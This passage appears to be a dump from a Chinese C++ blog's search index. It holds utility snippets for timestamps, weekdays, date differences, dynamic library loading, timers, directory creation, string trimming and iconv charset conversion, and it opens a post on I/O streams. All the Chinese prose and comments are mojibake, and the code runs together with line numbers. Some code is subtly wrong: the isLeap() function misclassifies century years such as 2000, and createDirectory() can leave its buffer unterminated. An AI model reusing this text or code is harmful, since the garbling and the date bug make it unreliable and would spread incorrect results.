chrono::duration_cast&lt;chrono::milliseconds&gt;(tp.time_since_epoch()).count(); return milliseconds / 1000;}int main() { long timestamp = getTimestamp("2021-01-08 21:27:00"); cout &lt;&lt; "timestamp = " &lt;&lt; timestamp &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1timestamp = 1610112420 æ ¼å¼åŒ–å½“å‰æ—¶é—´12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;// æ ¼å¼åŒ–å½“å‰æ—¶é—´// é»˜è®¤æ ¼å¼æ˜¯: 2020-06-07 23:46:53string formatCurrentTime() { time_t rawtime; struct tm* info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", info); string str(buffer); return str;}// æ ¼å¼åŒ–å½“å‰æ—¶é—´// format: æ ¼å¼å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ %Y-%m-%d %H:%M:%Sstring formatCurrentTime(string format) { time_t rawtime; struct tm* info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, format.c_str(), info); string str(buffer); return str;}int main() { cout &lt;&lt; formatCurrentTime() &lt;&lt; endl; cout &lt;&lt; formatCurrentTime("%Y-%m-%d") &lt;&lt; endl;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 122021-11-22 22:52:432021-11-22 è®¡ç®—æŒ‡å®šçš„æ—¥æœŸæ˜¯æ˜ŸæœŸå‡ 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;sstream&gt;using namespace std;// æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œè®¡ç®—å®ƒæ˜¯æ˜ŸæœŸå‡ // date: æ—¥æœŸå­—ç¬¦ä¸²ï¼Œæ ¼å¼æ˜¯: 2021-12-01// è¿”å›å€¼ï¼š1, 2, 3, 4, 5, 6, 0, å…¶ä¸­ 0 è¡¨ç¤ºæ˜ŸæœŸæ—¥int dayOfWeek(const string &amp;date) { char c; int y, m, d; stringstream(date) &gt;&gt; y &gt;&gt; c &gt;&gt; m &gt;&gt; c &gt;&gt; d; tm t = {0, 0, 0, d, m - 1, y - 1900}; mktime(&amp;t); return t.tm_wday;}// æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºå‘¨æœ«// date: æ—¥æœŸå­—ç¬¦ä¸²ï¼Œæ ¼å¼æ˜¯: 2021-12-01bool isWeekendDays(const string &amp;date) { int wday = dayOfWeek(date); if (wday == 6 || wday == 0) { return true; } return false;}int main() { cout &lt;&lt; dayOfWeek("2022-01-07") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-08") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-09") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-10") &lt;&lt; endl; cout &lt;&lt; (isWeekendDays("2022-01-09") ? "true" : "false") &lt;&lt; endl;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123455601true è®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹é—´çš„å¤©æ•°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;iostream&gt;using namespace std;// åˆ¤æ–­ä¸€ä¸ªå¹´ä»½æ˜¯å¦ä¸ºé—°å¹´bool isLeap(int year) { return (year % 4 == 0 || year % 400 == 0) &amp;&amp; (year % 100 != 0);}// è®¡ç®—ç‰¹å®šå¹´ä»½çš„å¤©æ•°int daysOfYear(int year) { return isLeap(year) ? 366 : 365;}// æ ¹æ®ç»™å®šçš„æ—¥æœŸï¼Œè®¡ç®—å®ƒåœ¨è¯¥å¹´çš„ç¬¬å‡ å¤©int dayOfYear(int year, int month, int day) { int DAY[12] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }; if (isLeap(year)) { DAY[1] = 29; } for (int i = 0; i &lt; month - 1; ++i) { day += DAY[i]; } return day;}// åˆ¤æ–­æ—¥æœŸå­—ç¬¦ä¸²æ˜¯å¦åˆæ³•ï¼Œå¹¶åˆ†åˆ«å–å‡ºæ—¥æœŸä¸­çš„å¹´æœˆæ—¥// date: æ—¥æœŸå­—ç¬¦ä¸²ï¼Œæ ¼å¼æ˜¯: 20211201bool stringToDate(string date, int&amp; year, int&amp; month, int&amp; day) { year = atoi(date.substr(0, 4).c_str()); month = atoi(date.substr(4, 2).c_str()); day = atoi(date.substr(6, 2).c_str()); int DAY[12] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }; if (isLeap(year)) { DAY[1] = 29; } return year &gt;= 0 &amp;&amp; month &lt;= 12 &amp;&amp; month &gt; 0 &amp;&amp; day &lt;= DAY[month - 1] &amp;&amp; day &gt; 0;}// è®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹é—´çš„å¤©æ•°// date1: æ—¥æœŸå­—ç¬¦ä¸²ï¼Œæ ¼å¼æ˜¯: 20211201// date2: æ—¥æœŸå­—ç¬¦ä¸²ï¼Œæ ¼å¼æ˜¯: 20211201// å½“è¿”å›å€¼ä¸º -1 æ—¶ï¼Œè¯´æ˜æ—¥æœŸçš„æ ¼å¼ä¸æ­£ç¡®int daysBetween2Date(string date1, string date2) { int year1, month1, day1; int year2, month2, day2; if (!stringToDate(date1, year1, month1, day1) || !stringToDate(date2, year2, month2, day2)) { cout &lt;&lt; "è¾“å…¥çš„æ—¥æœŸæ ¼å¼ä¸æ­£ç¡®"; return -1; } if (year1 == year2 &amp;&amp; month1 == month2) { return day1 &gt; day2 ? day1 - day2 : day2 - day1; } else if (year1 == year2) { int d1, d2; d1 = dayOfYear(year1, month1, day1); d2 = dayOfYear(year2, month2, day2); return d1 &gt; d2 ? d1 - d2 : d2 - d1; } else { // ç¡®ä¿year1å¹´ä»½æ¯”year2æ—© if (year1 &gt; year2) { swap(year1, year2); swap(month1, month2); swap(day1, day2); } // è®¡ç®—ç¬¬ä¸€ä¸ªæ—¥æœŸåœ¨è¯¥å¹´è¿˜å‰©å¤šå°‘å¤© int d1, d2, d3; if (isLeap(year1)) { d1 = 366 - dayOfYear(year1, month1, day1); } else { d1 = 365 - dayOfYear(year1, month1, day1); } // è®¡ç®—ç¬¬äºŒæ—¥æœŸåœ¨å½“å¹´ä¸­çš„ç¬¬å‡ å¤© d2 = dayOfYear(year2, month2, day2); // è®¡ç®—ä¸¤ä¸ªå¹´ä»½ç›¸éš”çš„å¤©æ•° d3 = 0; for (int year = year1 + 1; year &lt; year2; year++) { if (isLeap(year)) d3 += 366; else d3 += 365; } return d1 + d2 + d3; }}int main() { int days = daysBetween2Date("20101111", "20111111"); cout &lt;&lt; "ç›¸å·® " &lt;&lt; days &lt;&lt; " å¤©" &lt;&lt; endl; int days2 = daysBetween2Date("20200202", "20200131"); cout &lt;&lt; "ç›¸å·® " &lt;&lt; days2 &lt;&lt; " å¤©" &lt;&lt; endl; int days3 = daysBetween2Date("20230712", "20050619"); cout &lt;&lt; "ç›¸å·® " &lt;&lt; days3 &lt;&lt; " å¤©" &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123ç›¸å·® 365 å¤©ç›¸å·® 2 å¤©ç›¸å·® 6597 å¤© åŠ è½½åŠ¨æ€åº“åŠ è½½åŠ¨æ€åº“ï¼ˆ.soï¼‰æç¤º ä¸‹è¿°ç¤ºä¾‹ä»£ç ï¼Œé€‚ç”¨äº Linux ç³»ç»Ÿçš„ C++ å¼€å‘ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;stdlib.h&gt;#include &lt;iostream&gt;using namespace std;int main(){ int a = 0; // åŠ è½½åŠ¨æ€åº“ void *handle = dlopen("./libadd_c.so", RTLD_LAZY); if(!handle) { printf("open lib error\\n"); cout&lt;&lt;dlerror()&lt;&lt;endl; return -1; } // å®šä¹‰å‡½æ•°æŒ‡é’ˆç±»å‹ typedef int (*add_t)(int a, int b); // è°ƒç”¨åŠ¨æ€åº“ add_t add = (add_t) dlsym(handle, "add"); if(!add) { cout&lt;&lt;dlerror()&lt;&lt;endl; dlclose(handle); return -1; } a = add(3, 4); printf("a = %d\\n",a); // é‡Šæ”¾åŠ¨æ€åº“ dlclose(handle); return 0;} åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼ˆ.dllï¼‰æç¤º ä¸‹è¿°ç¤ºä¾‹ä»£ç ï¼Œé€‚ç”¨äº Windows ç³»ç»Ÿçš„ C++ å¼€å‘ã€‚ 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;windows.h&gt;using namespace std;int main() { HINSTANCE hInstance; // åŠ è½½åŠ¨æ€é“¾æ¥åº“ hInstance = LoadLibrary("./socketclient.dll"); if (hInstance == NULL) { printf("LoadLibrary() è°ƒç”¨å¤±è´¥, ErrorCode: %d", GetLastError()); return -1; } // å®šä¹‰å‡½æ•°ç±»å‹æŒ‡é’ˆ typedef int (*CltSocketInit)(void** handle); // è°ƒç”¨åŠ¨æ€é“¾æ¥åº“ CltSocketInit cltSocketInit = (CltSocketInit)GetProcAddress(hInstance, "cltSocketInit"); if (cltSocketInit != NULL) { void* handle = NULL; int result = cltSocketInit(&amp;handle); printf("result = %d", result); } // é‡Šæ”¾åŠ¨æ€é“¾æ¥åº“ if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} ä»»åŠ¡è°ƒåº¦å®šæ—¶å™¨æç¤º åŸºäº C++ 11 å®ç°ç­‰ä»·äº Javascript çš„ setTimeout() å’Œ setInterval() å‡½æ•°ã€‚ timer.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;thread&gt;#include &lt;chrono&gt;#include &lt;atomic&gt;using namespace std;class Timer {public: typedef void(TimerFunction)();public: void setTimeout(TimerFunction, long delay); void setInterval(TimerFunction, long interval); void stop();private: atomic&lt;bool&gt; active{ true };};void Timer::setTimeout(TimerFunction function, long delay) { active = true; thread t([=]() { if (!active.load()) return; this_thread::sleep_for(chrono::milliseconds(delay)); if (!active.load()) return; function(); }); t.detach();}void Timer::setInterval(TimerFunction function, long interval) { active = true; thread t([=]() { while (active.load()) { this_thread::sleep_for(chrono::milliseconds(interval)); if (!active.load()) return; function(); } }); t.detach();}void Timer::stop() { active = false;} main.cpp 12345678910111213141516171819#include &lt;conio.h&gt;#include &lt;iostream&gt;#include "timer.h"using namespace std;void refreshConfig() { cout &lt;&lt; "execute refresh config ..." &lt;&lt; endl;}int main() { // ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆ unique_ptr&lt;Timer&gt; timer(new Timer()); Timer::TimerFunction* refreshFunc = refreshConfig; timer-&gt;setInterval(refreshConfig, 3000); timer-&gt;setTimeout(refreshConfig, 5000); _getch(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345execute refresh config ...execute refresh config ...execute refresh config ...execute refresh config ...execute refresh config ... çº¿ç¨‹ä¼‘çœ sleep() å‡½æ•°çš„åŠŸèƒ½æ˜¯è®©ç¨‹åºçš„æ‰§è¡ŒæŒ‚èµ·ä¸€æ®µæ—¶é—´ï¼Œä¹Ÿå°±æ˜¯ç­‰å¾…ä¸€æ®µæ—¶é—´å†ç»§ç»­å¾€ä¸‹æ‰§è¡Œã€‚ ä¸åŒå¹³å°å’Œä¸åŒç¼–è¯‘å™¨çš„åŒºåˆ« sleep() å‡½æ•°åœ¨ Linux å¹³å°çš„å¤´æ–‡ä»¶æ˜¯ unistd.h sleep() å‡½æ•°åœ¨ Windows å¹³å°çš„å¤´æ–‡ä»¶æ˜¯ windows.h sleep() å‡½æ•°çš„åç§°æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼Œæœ‰çš„ç¼–è¯‘å™¨æ˜¯å¤§å†™ï¼Œæœ‰çš„æ˜¯å°å†™ sleep() å‡½æ•°ä¼‘çœ çš„æ—¶é—´ï¼Œåœ¨ Windows å¹³å°ä¸‹æ˜¯ä»¥ æ¯«ç§’ ä¸ºå•ä½ï¼Œè€Œåœ¨ Linux å¹³å°æ˜¯ä»¥ ç§’ ä¸ºå•ä½ 123456789101112131415// Windowså¹³å°çš„å†™æ³•#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;windows.h&gt;int main(){ int a = 1; while (a) { printf("Welcome to songjiahao\'s blog\\n"); Sleep(1000); } system("pause"); return 0;} æ–‡ä»¶å¤„ç†åˆ›å»ºæ–‡ä»¶å¤¹æç¤º ä¸‹è¿° C++ ä»£ç å…¼å®¹ Linux ä¸ Windows å¹³å°ï¼Œç”¨äºåˆ›å»ºæ–‡ä»¶å¤¹ä»¥åŠå­æ–‡ä»¶å¤¹ fileutil.h 123456789101112131415161718192021222324#pragma once#ifdef WIN32#include &lt;io.h&gt;#include &lt;direct.h&gt;#else#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;#endif#ifdef WIN32#define ACCESS(fileName, accessMode) _access(fileName, accessMode)#define MKDIR(path) _mkdir(path)#else#define ACCESS(fileName, accessMode) access(fileName, accessMode)#define MKDIR(path) mkdir(path, S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH)#endif#include &lt;iostream&gt;#define MAX_PATH_LEN 256using namespace std;int32_t createDirectory(const string &amp;dirPath); fileutil.cpp 123456789101112131415161718192021222324#include "fileutil.h"// æ ¹æ®ç›®å½•è·¯å¾„ï¼Œä»å·¦åˆ°å³ä¾æ¬¡åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™åˆ›å»º// æ³¨æ„ï¼šæœ€åä¸€ä¸ªå¦‚æœæ˜¯ç›®å½•çš„è¯ï¼Œåˆ™å¿…é¡»åŠ ä¸Š \'\\\\\' æˆ–è€… \'/\'// ç¤ºä¾‹: /usr/local/scripts/int32_t createDirectory(const string &amp;dirPath) { uint32_t dirPathLen = dirPath.length(); if (dirPathLen &gt; MAX_PATH_LEN) { return -1; } char tmpDirPath[MAX_PATH_LEN] = {0}; for (uint32_t i = 0; i &lt; dirPathLen; ++i) { tmpDirPath[i] = dirPath[i]; if (tmpDirPath[i] == \'\\\\\' || tmpDirPath[i] == \'/\') { if (ACCESS(tmpDirPath, 0) != 0) { int32_t ret = MKDIR(tmpDirPath); if (ret != 0) { return ret; } } } } return 0;} å­—ç¬¦ä¸²å¤„ç†åˆ†å‰²å­—ç¬¦ä¸²1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;// åˆ†å‰²å­—ç¬¦ä¸²// str: è¦åˆ†å‰²çš„å­—ç¬¦ä¸²// delim: åˆ†å‰²å­—ç¬¦vector&lt;string&gt; split(const string &amp;str, const char &amp;delim = \' \') { vector&lt;string&gt; tokens; size_t lastPos = str.find_first_not_of(delim, 0); size_t pos = str.find(delim, lastPos); while (lastPos != string::npos) { tokens.emplace_back(str.substr(lastPos, pos - lastPos)); lastPos = str.find_first_not_of(delim, pos); pos = str.find(delim, lastPos); } return tokens;}int main() { vector&lt;string&gt; strResult = split("Hello,World,!", \',\'); for (auto it = strResult.begin(); it != strResult.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; }} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1Hello World ! å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼1234567891011121314151617181920#include &lt;iostream&gt;using namespace std;// å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);}int main() { string str = " hello "; trim(str); cout &lt;&lt; "str=" &lt;&lt; str &lt;&lt; endl; string str2 = str + "world"; cout &lt;&lt; "str2=" &lt;&lt; str2 &lt;&lt; endl;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12str=hellostr2=helloworld åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºä¸²12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;using namespace std;// å»é™¤å­—ç¬¦ä¸²ä¸¤è¾¹çš„ç©ºæ ¼void trim(string &amp;str) { if (str.empty()) { return; } str.erase(0, str.find_first_not_of(" ")); str.erase(str.find_last_not_of(" ") + 1);}// åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä¸ºç©ºä¸²// "" -&gt; true// " " -&gt; true// "a" -&gt; false// " a " -&gt; falsebool empty(const string &amp;str) { if (str.empty()) { return true; } string strTemp = str; trim(strTemp); return strTemp.length() == 0;}int main() { string str1 = ""; string str2 = " "; string str3 = "a"; string str4 = " a "; cout &lt;&lt; (empty(str1) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str2) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str3) ? "true" : "false") &lt;&lt; endl; cout &lt;&lt; (empty(str4) ? "true" : "false") &lt;&lt; endl;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1234truetruefalsefalse è½¬æ¢å­—ç¬¦é›†ç¼–ç 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 // Gb2312 è½¬æ¢ Utf8 ç¼–ç // iInLençš„é•¿åº¦ä¸åŒ…æ‹¬\'\\0\'å­—ç¬¦ï¼Œåº”è¯¥ç”¨strlen()ï¼Œè¿”å›å€¼æ˜¯å¤„ç†åçš„sOuté•¿åº¦int Gb2312ToUtf8(char *sOut, int iMaxOutLen, const char *sIn, int iInLen) { char *pIn = (char *) sIn; char *pOut = sOut; size_t ret; size_t iLeftLen = iMaxOutLen; iconv_t cd; cd = iconv_open("utf-8", "gb2312"); if (cd == (iconv_t) -1) { return -1; } size_t iSrcLen = iInLen; ret = iconv(cd, &amp;pIn, &amp;iSrcLen, &amp;pOut, &amp;iLeftLen); if (ret == (size_t) -1) { iconv_close(cd); return -1; } iconv_close(cd); return (iMaxOutLen - iLeftLen);}// Utf8 è½¬æ¢ Gb2312 ç¼–ç // iInLençš„é•¿åº¦ä¸åŒ…æ‹¬\'\\0\'å­—ç¬¦ï¼Œåº”è¯¥ç”¨strlen()ï¼Œè¿”å›å€¼æ˜¯å¤„ç†åçš„sOuté•¿åº¦int Utf8ToGb2312(char *sOut, int iMaxOutLen, const char *sIn, int iInLen) { char *pIn = (char *) sIn; char *pOut = sOut; size_t ret; size_t iLeftLen = iMaxOutLen; iconv_t cd; cd = iconv_open("gb2312", "utf-8"); if (cd == (iconv_t) -1) { return -1; } size_t iSrcLen = iInLen; ret = iconv(cd, &amp;pIn, &amp;iSrcLen, &amp;pOut, &amp;iLeftLen); if (ret == (size_t) -1) { iconv_close(cd); return -1; } iconv_close(cd); return (iMaxOutLen - iLeftLen);} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++ ä»£ç å—"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹å››",url:"/posts/791ffdcd.html",text:'æ ‡å‡† I/O æµçš„ä»‹ç»I/O æµçš„æ¦‚å¿µç¨‹åºçš„è¾“å…¥æŒ‡çš„æ˜¯ä»è¾“å…¥æ–‡ä»¶å°†æ•°æ®ä¼ é€ç»™ç¨‹åºï¼Œç¨‹åºçš„è¾“å‡ºæŒ‡çš„æ˜¯ä»ç¨‹åºå°†æ•°æ®ä¼ é€ç»™è¾“å‡ºæ–‡ä»¶ã€‚C++ çš„è¾“å…¥è¾“å‡ºåŒ…å«ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢çš„å†…å®¹ï¼š å¯¹ç³»ç»ŸæŒ‡å®šçš„æ ‡å‡†è®¾å¤‡çš„è¾“å…¥å’Œè¾“å‡ºï¼šå³ä»é”®ç›˜è¾“å…¥æ•°æ®ï¼Œè¾“å‡ºåˆ°æ˜¾ç¤ºå™¨å±å¹•ã€‚è¿™ç§è¾“å…¥è¾“å‡ºç§°ä¸ºæ ‡å‡†çš„è¾“å…¥è¾“å‡ºï¼Œç®€ç§° æ ‡å‡† I/Oã€‚ ä»¥å¤–å­˜ç£ç›˜æ–‡ä»¶ä¸ºå¯¹è±¡è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºï¼šå³ä»ç£ç›˜æ–‡ä»¶è¾“å…¥æ•°æ®ï¼Œæ•°æ®è¾“å‡ºåˆ°ç£ç›˜æ–‡ä»¶ã€‚ä»¥å¤–å­˜æ–‡ä»¶ä¸ºå¯¹è±¡çš„è¾“å…¥è¾“å‡ºç§°ä¸ºæ–‡ä»¶çš„è¾“å…¥è¾“å‡ºï¼Œç®€ç§° æ–‡ä»¶ I/Oã€‚ å¯¹å†…å­˜ä¸­æŒ‡å®šçš„ç©ºé—´è¿›è¡Œè¾“å…¥å’Œè¾“å‡ºï¼šé€šå¸¸æŒ‡å®šä¸€ä¸ªå­—ç¬¦æ•°ç»„ä½œä¸ºå­˜å‚¨ç©ºé—´ï¼ˆå®é™…ä¸Šå¯ä»¥åˆ©ç”¨è¯¥å†…å­˜ç©ºé—´å­˜å‚¨ä»»ä½•ä¿¡æ¯ï¼‰ã€‚è¿™ç§è¾“å…¥å’Œè¾“å‡ºç§°ä¸ºå­—ç¬¦ä¸²è¾“å…¥è¾“å‡ºï¼Œç®€ç§° ä¸² I/Oã€‚ I/O æµç±»åº“çš„ç»“æ„åœ¨ C è¯­è¨€ä¸­ï¼Œç”¨ printf å’Œ scanf è¿›è¡Œè¾“å…¥è¾“å‡ºï¼Œå¾€å¾€ä¸èƒ½ä¿è¯æ‰€è¾“å…¥è¾“å‡ºçš„æ•°æ®æ˜¯å¯é çš„å®‰å…¨çš„ã€‚åœ¨ C++ çš„è¾“å…¥è¾“å‡ºä¸­ï¼Œç¼–è¯‘ç³»ç»Ÿå¯¹æ•°æ®ç±»å‹è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå‡¡æ˜¯ç±»å‹ä¸æ­£ç¡®çš„æ•°æ®éƒ½ä¸å¯èƒ½é€šè¿‡ç¼–è¯‘ã€‚å› æ­¤ C++ çš„ I/O æ“ä½œæ˜¯ç±»å‹å®‰å…¨ï¼ˆType Safeï¼‰çš„ã€‚C++ çš„ I/O æ“ä½œæ˜¯å¯æ‰©å±•çš„ï¼Œä¸ä»…å¯ä»¥ç”¨æ¥è¾“å…¥è¾“å‡ºæ ‡å‡†ç±»å‹çš„æ•°æ®ï¼Œä¹Ÿå¯ä»¥ç”¨äºç”¨æˆ·è‡ªå®šä¹‰ç±»å‹çš„æ•°æ®ã€‚C++ é€šè¿‡ I/O ç±»åº“æ¥å®ç°ä¸°å¯Œçš„ I/O åŠŸèƒ½ã€‚è¿™æ ·ä½¿ C++ çš„è¾“äººè¾“å‡ºæ˜æ˜¾åœ°ä¼˜äº C è¯­è¨€ä¸­çš„ printf å’Œ scanfï¼Œä½†æ˜¯ä¹Ÿä¸ºä¹‹ä»˜å‡ºäº†ä»£ä»·ï¼ŒC++ çš„ I/O ç³»ç»Ÿå› æ­¤å˜å¾—æ¯”è¾ƒå¤æ‚ï¼Œè¦æŒæ¡è®¸å¤šä½¿ç”¨ç»†èŠ‚ã€‚C++ ç¼–è¯‘ç³»ç»Ÿæä¾›äº†ç”¨äºè¾“å…¥è¾“å‡ºçš„ iostream ç±»åº“ã€‚iostream è¿™ä¸ªå•è¯æ˜¯ç”± 3 ä¸ªéƒ¨åˆ†ç»„æˆçš„ï¼Œå³ i-o-streamï¼Œæ„ä¸ºè¾“å…¥è¾“å‡ºæµã€‚åœ¨ iostream ç±»åº“ä¸­åŒ…å«è®¸å¤šç”¨äºè¾“å…¥è¾“å‡ºçš„ç±»ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ios æ˜¯æŠ½è±¡åŸºç±»ï¼Œç”±å®ƒæ´¾ç”Ÿå‡º istream ç±»å’Œ ostream ç±»ï¼Œä¸¤ä¸ªç±»åä¸­ç¬¬ 1 ä¸ªå­—æ¯ i å’Œ o åˆ†åˆ«ä»£è¡¨è¾“å…¥ï¼ˆinputï¼‰å’Œè¾“å‡ºï¼ˆoutputï¼‰ã€‚istream ç±»æ”¯æŒè¾“å…¥æ“ä½œï¼Œostream ç±»æ”¯æŒè¾“å‡ºæ“ä½œï¼Œiostream ç±»æ”¯æŒè¾“å…¥è¾“å‡ºæ“ä½œã€‚iostream ç±»æ˜¯ä» istream ç±»å’Œ ostream ç±»é€šè¿‡å¤šé‡ç»§æ‰¿è€Œæ´¾ç”Ÿçš„ç±»ï¼Œå…¶ç»§æ‰¿å±‚æ¬¡å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š iostream ç±»åº“ä¸­ä¸åŒçš„ç±»çš„å£°æ˜è¢«æ”¾åœ¨ä¸åŒçš„å¤´æ–‡ä»¶ä¸­ï¼Œç”¨æˆ·åœ¨è‡ªå·±çš„ç¨‹åºä¸­ç”¨ #include å‘½ä»¤åŒ…å«äº†æœ‰å…³çš„å¤´æ–‡ä»¶ï¼Œè¿™å°±ç›¸å½“äºåœ¨æœ¬ç¨‹åºä¸­å£°æ˜äº†æ‰€éœ€è¦ç”¨åˆ°çš„ç±»ã€‚å¯ä»¥æ¢ â€” ç§è¯´æ³•ï¼šå¤´æ–‡ä»¶æ˜¯ç¨‹åºä¸ç±»åº“çš„æ¥å£ã€‚iostream ç±»åº“çš„æ¥å£åˆ†åˆ«ç”±ä¸åŒçš„å¤´æ–‡ä»¶æ¥å®ç°ï¼Œå¸¸ç”¨çš„å¤´æ–‡ä»¶å¦‚ä¸‹ï¼š strstreamï¼šç”¨äºå­—ç¬¦ä¸²æµ I/O fstreamï¼šç”¨äºå®ç°æ–‡ä»¶çš„ I/O æ“ä½œ iomanipï¼šåœ¨ä½¿ç”¨æ ¼å¼åŒ– I/O æ—¶ï¼Œåº”åŒ…å«æ­¤å¤´æ–‡ä»¶ iostreamï¼šåŒ…å«äº†å¯¹è¾“å…¥è¾“å‡ºæµè¿›è¡Œæ“ä½œæ‰€éœ€çš„åŸºæœ¬ä¿¡æ¯ stdiostreamï¼šç”¨äºæ··åˆä½¿ç”¨ C è¯­è¨€å’Œ C++ çš„ I/O æœºåˆ¶ï¼Œä¾‹å¦‚å¸Œæœ›å°† C è¯­è¨€ç¨‹åºè½¬å˜ä¸º C++ ç¨‹åº åœ¨ iostream å¤´æ–‡ä»¶ä¸­å®šä¹‰çš„ç±»æœ‰ iosï¼Œistreamï¼Œostreamï¼Œiostreamï¼Œistream_withassignï¼Œostream_withassignï¼Œiostream_withassign ç­‰ã€‚åœ¨ iostream å¤´æ–‡ä»¶ä¸­ä¸ä»…å®šä¹‰äº†ç›¸å…³çš„ç±»ï¼Œè¿˜å®šä¹‰äº† 4 ç§æ ‡å‡† I/O å¯¹è±¡ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š &lt;&lt; å’Œ &gt;&gt; æœ¬æ¥åœ¨ C++ ä¸­æ˜¯è¢«å®šä¹‰ä¸ºå·¦ä½ç§»è¿ç®—ç¬¦å’Œå³ä½ç§»è¿ç®—ç¬¦çš„ï¼Œç”±äºåœ¨ iostream å¤´æ–‡ä»¶ä¸­å¯¹å®ƒä»¬è¿›è¡Œäº†é‡è½½ï¼Œä½¿å®ƒä»¬èƒ½ç”¨ä½œæ ‡å‡†ç±»å‹æ•°æ®çš„è¾“å…¥å’Œè¾“å‡ºè¿ç®—ç¬¦ã€‚æ‰€ä»¥ï¼Œåœ¨ä½¿ç”¨åˆ°å®ƒä»¬çš„ç¨‹åºä¸­å¿…é¡»ç”¨ #include &lt;iostream&gt; å‘½ä»¤å°†å…¶åŒ…å«åˆ°ç¨‹åºä¸­ã€‚åœ¨ iostream ä¸­åªå¯¹ &lt;&lt; å’Œ &gt;&gt; è¿ç®—ç¬¦ç”¨äºæ ‡å‡†ç±»å‹æ•°æ®çš„è¾“å…¥è¾“å‡ºè¿›è¡Œäº†é‡è½½ï¼Œä½†æœªå¯¹ç”¨æˆ·å£°æ˜çš„ç±»å‹æ•°æ®çš„è¾“å…¥è¾“å‡ºè¿›è¡Œé‡è½½ã€‚å¦‚æœç”¨æˆ·å£°æ˜äº†æ–°çš„ç±»å‹ï¼Œå¹¶å¸Œæœ›ç”¨ &lt;&lt; å’Œ &gt;&gt; è¿ç®—ç¬¦å¯¹å…¶è¿›è¡Œè¾“å…¥è¾“å‡ºï¼Œåˆ™éœ€è¦æŒ‰ç…§ C++ çš„è¿ç®—ç¬¦é‡è½½è§„åˆ™æ¥åšã€‚ æ ‡å‡† I/O æµçš„ä½¿ç”¨æ ‡å‡†è¾“å…¥æµçš„ç®€å•ä½¿ç”¨æ 